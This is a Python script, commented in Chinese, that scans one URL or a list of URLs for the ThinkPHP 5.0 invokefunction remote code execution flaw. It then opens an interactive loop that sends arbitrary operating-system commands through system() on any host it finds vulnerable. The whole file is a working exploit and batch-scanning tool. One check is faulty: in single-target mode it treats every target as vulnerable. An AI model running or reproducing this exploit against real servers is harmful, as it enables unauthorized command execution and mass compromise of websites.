# -*- coding:utf-8 -*-

from debugpy import trace_this_thread
import requests
import argparse
import sys

def cmdline():
    # 添加描述信息 和 帮助信息
    parser = argparse.ArgumentParser(description='ThinkPHP 5.0 RCE 漏洞检测脚本', usage="python thinkphp_rce.py", add_help=True)
    # 添加参数 -t 或 --target  添加参数帮助
    parser.add_argument('-t', '--target', help='设置扫描的url')
    parser.add_argument('-f', '--file', help='指定url列表文件进行批量扫描')
    # 判断用户是否输入了参数，如果没有，则打印帮助信息
    if len(sys.argv) == 1:
        sys.argv.append('-h')

    return parser.parse_args()  

def file_read(filename):
    try:
        f = open(filename, 'r')
        urls = f.readlines()
        return urls
    except:
        pass    


def bug_poc(target_url):
    payload = target_url + "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
    response = requests.get(url=payload)
    response_html = response.text
    if 'PHP' in response_html:
        return [True, response]  
    else:
        return [False, response]     


def bug_exp(target_url):
    while True:
        cmd = input('> ')
        if cmd == 'exit':
            break
        rce_payload = target_url + "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}"\
            .format(str(cmd)) 
        try:
            response2 = requests.get(url= rce_payload)
            result = response2.text.split('\n')
            if result[0] == result[1]:
                result = result[0]
            print(result)
        except:
            continue

def main():
    
    args = cmdline()
    
   
    # 如果用户 传入了 url ，就进行单独扫描
    if args.target is not None:
        target_url = args.target
        flag = bug_poc(target_url)
        if flag :
            print('漏洞存在！')
            bug_exp(target_url)
    # 如果用户 传入了 file ，就对文件进行读取，并扫描
    elif args.file is not None:
        target_urls = file_read(args.file)
        for url in target_urls:
            flag = bug_poc(url.strip())
            if flag[0]:
                print('[+]漏洞存在! ' + flag[1].url )
                text = input('是否利用漏洞 [N/y]')
                if text == 'y':
                    bug_exp(url.strip()) 
                else:
                    continue       
            else:
                print('[-]漏洞不存在！' + flag[1].url)     
    
    


if __name__ == '__main__':
    main()